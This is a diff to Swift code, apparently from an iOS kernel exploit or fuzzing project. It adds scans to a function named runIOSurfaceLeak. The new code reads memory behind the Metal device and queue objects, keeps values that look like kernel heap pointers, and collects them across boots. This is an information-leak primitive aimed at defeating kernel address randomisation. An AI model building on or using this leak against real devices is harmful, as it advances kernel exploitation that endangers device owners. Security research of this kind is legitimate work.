@@ -1905,6 +1905,15 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KGAP=\(kgap) KMMIO=\(kmmio)")
         }
 
+        // Scan 0: Metal device/queue ObjC objects — guaranteed Metal driver state, no zone hunting.
+        // These are user-space ObjC pointers. Their contents embed KHEAP refs to driver kernel objects.
+        // Avoids relying on the IOSurface allocation landing in the right zone.
+        let deviceUAddr = UInt(bitPattern: Unmanaged.passUnretained(device as AnyObject).toOpaque())
+        let queueUAddr  = UInt(bitPattern: Unmanaged.passUnretained(queue  as AnyObject).toOpaque())
+        scanAddr("metal_dev_0",   deviceUAddr,           131072)
+        scanAddr("metal_dev_1",   deviceUAddr + 131072,  131072)
+        scanAddr("metal_queue_0", queueUAddr,            65536)
+
         let base = UInt(bitPattern: baseAddr)
 
         // Scan 1: mapped allocation (safe)
@@ -2084,6 +2093,37 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
         } else {
             step("  post_relock_tail: vm_read kr=\(prtKr)")
         }
+
+        // Metal device KHEAP accumulation — scan device ObjC object directly for boot-variant KHEAP values.
+        // Guaranteed to read Metal driver state regardless of where IOSurface allocation landed.
+        // Values are added to _thisBootKheap so cross-boot delta has them even when IOSurface misses the zone.
+        var mdAccumCount = 0
+        for chunk in [deviceUAddr, deviceUAddr + 131072] {
+            var mdBuf = [UInt8](repeating: 0, count: 131072)
+            var mdOut: vm_size_t = 0
+            let mdKr: kern_return_t = mdBuf.withUnsafeMutableBytes { b in
+                vm_read_overwrite(mach_task_self_,
+                                  vm_address_t(chunk),
+                                  vm_size_t(131072),
+                                  vm_address_t(bitPattern: b.baseAddress!),
+                                  &mdOut)
+            }
+            guard mdKr == 0 else { continue }
+            for qw in 0..<(Int(mdOut)/8) {
+                var v: UInt64 = 0
+                for b in 0..<8 { v |= UInt64(mdBuf[qw*8+b]) << (b*8) }
+                guard v >= 0xFFFFFE0000000000 && v <= 0xFFFFFEFFFFFFFFFF else { continue }
+                let b0 = UInt8(v & 0xFF)
+                guard v != UInt64(b0) &* 0x0101010101010101 else { continue }
+                guard (v & 0xFFFFFFFFFFFFFFF0) != 0xFFFFFFFFFFFFFFF0 else { continue }
+                _thisBootKheap.insert(v)
+                mdAccumCount += 1
+            }
+        }
+        if mdAccumCount > 0 {
+            step("metal_dev_accum: \(mdAccumCount) KHEAP inserts from device scan (total set=\(_thisBootKheap.count))")
+        }
+
         _iosurfRunCount += 1
 
         // Scan 4: second IOSurface with DIFFERENT variant — allocator residue from freed pages
